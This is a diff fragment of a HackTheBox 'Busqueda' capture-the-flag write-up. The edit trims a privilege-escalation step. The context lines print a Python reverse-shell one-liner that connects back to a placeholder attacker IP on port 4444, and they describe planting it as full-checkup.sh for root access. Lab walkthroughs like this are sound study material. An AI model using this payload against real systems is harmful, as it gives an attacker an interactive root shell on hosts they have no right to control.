@@ -45,7 +45,7 @@ after searching on Google, it is found that the URL: https://github.com/nexis-ne
 
 ![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/07ace5e3-0083-427b-8172-68e678f3733a)
 
-• enumeration to get a root shell, you will find docker-inspect, and try to get a code from Google to get the high privilege, with the help of this 
+• enumeration to get a root shell, and try to get a code from Google to get the high privilege, with the help of this 
 URL:  https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/   
 with the code: import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
 after putting the code in a Python file with the name **full-checkup.sh** and opening a Python server to send the file from my local machine to the web server with the command 
